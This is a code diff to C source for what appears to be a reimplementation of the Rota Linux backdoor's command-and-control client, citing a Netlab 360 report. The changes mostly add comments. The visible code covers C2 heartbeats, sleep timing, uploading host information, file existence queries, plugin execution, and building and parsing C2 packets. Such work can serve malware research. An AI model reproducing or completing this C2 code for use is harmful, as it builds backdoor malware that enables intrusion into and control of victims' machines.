@@ -18,8 +18,6 @@
 #include "c2_loop.h"
 
 
-// https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
-
 unsigned char payloadLen[] = {0x0f};
 unsigned char keyLen[] = {0x00,0x00};
 unsigned char cmd_id[] = {0x00, 0x00, 0x00, 0x00};
@@ -82,12 +80,13 @@ void c2_heartbeat(char *cmd_id, int sock) {
 }
 
 void c2_set_timeout(int *sleepTime, int newTime) {
+    // update sleep time between connections to C2 server
     *sleepTime = newTime;
 }
 
 
 void c2_upload_device_info(char *buffer) {
-    // Netlab 360 make this look like populating a uname struct, /etc/os-relase/etc...
+    // Netlab 360 report suggest this is populating a uname struct
 
     // ptr is null
     if (!buffer){
@@ -106,6 +105,7 @@ void c2_upload_device_info(char *buffer) {
                 17);
     }
 
+    // Structure is hostname-architecture-Linux-kernel-verison
     snprintf(buffer, 260, "%s-%s-%s-%s",
              hostinfo.nodename,
              hostinfo.machine,
@@ -118,10 +118,10 @@ bool c2_query_file(char *fpath) {
 
     // F_OK == existence test
     if ((access(fpath, F_OK)) == 0) {
-
+        // file exists
         return true;
     }
-
+    // file does not exist...
     return false;
 }
 
@@ -157,6 +157,7 @@ void c2_run_plugin_1(char *funcName) {
 
 char *initial_rota_pkt() {
 
+    // build initial 82 byte rota header
     char *rotaHdr = (char *)malloc(82);
     if (rotaHdr == NULL) {
         #ifdef DEBUG
@@ -216,6 +217,7 @@ char *parse_c2_payload( char *buffer, int length) {
         return payload;
     }
     memset(payload, 0, length);
+    
     // copy last N-bytes from rota payload
     payload[length] = '\0';
     memcpy(payload, &buffer[82], length);
